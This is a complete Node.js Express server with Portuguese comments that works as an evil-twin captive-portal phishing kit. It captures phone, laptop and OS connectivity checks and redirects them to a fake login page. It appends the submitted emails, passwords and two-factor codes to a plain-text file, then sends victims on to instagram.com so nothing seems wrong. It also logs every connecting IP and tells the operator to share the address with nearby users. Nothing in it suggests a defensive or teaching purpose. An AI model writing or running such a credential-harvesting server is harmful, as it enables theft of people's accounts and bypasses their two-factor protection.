const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const os = require('os');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logar todas as conexões (quem "entra na rede" ou acessa o servidor)
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const time = new Date().toLocaleString('pt-BR');
  console.log(`\x1b[32m[${time}] NOVO DISPOSITIVO CONECTADO: ${ip}\x1b[0m`);
  console.log(`   - Acessando: ${req.url}`);
  next();
});

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal && iface.address.startsWith('192.168.')) {
        return iface.address;
      }
    }
  }
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// --- ROTAS PARA CAPTIVE PORTAL (NOTIFICAÇÃO) ---
// Estas rotas são acessadas pelo Android/iOS/Windows para testar a internet
const captivePortalPaths = [
  '/generate_204',
  '/gen_204',
  '/hotspot-detect.html',
  '/hotspot-detect.php',
  '/library/test/success.html',
  '/success.txt',
  '/ncsi.txt',
  '/check_network_status',
  '/connectivity-check.html'
];

app.get(captivePortalPaths, (req, res) => {
  console.log(`Captive Portal Detectado: ${req.url} de ${req.ip}`);
  res.redirect(302, '/'); // Força o redirecionamento para a página inicial
});
// ----------------------------------------------

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/2fa', (req, res) => {
  res.sendFile(path.join(__dirname, '2fa.html'));
});

app.post('/login', (req, res) => {
  const { email, senha } = req.body;
  const data = `[LOGIN] Data: ${new Date().toLocaleString()} - Email/Usuario: ${email} - Senha: ${senha}\n`;

  fs.appendFile('logins.txt', data, (err) => {
    if (err) throw err;
    console.log(`\x1b[33m[LOGIN REGISTRADO] ${email}\x1b[0m`);
  });

  res.redirect('/2fa');
});

app.post('/verify', (req, res) => {
  const { code } = req.body;
  const data = `[2FA CODE] Data: ${new Date().toLocaleString()} - Codigo: ${code}\n`;

  fs.appendFile('logins.txt', data, (err) => {
    if (err) throw err;
    console.log(`\x1b[35m[2FA REGISTRADO] Codigo: ${code}\x1b[0m`);
  });

  res.send('<script>alert("Autenticação concluída!"); window.location.href = "https://www.instagram.com";</script>');
});

app.listen(PORT, '0.0.0.0', () => {
  const localIP = getLocalIP();
  console.log(`Servidor rodando em:`);
  console.log(`  - Local: http://localhost:${PORT}`);
  console.log(`  - Rede local: http://${localIP}:${PORT}`);
  console.log(`\nCompartilhe o endereço da rede local com quem estiver na mesma rede!`);
});
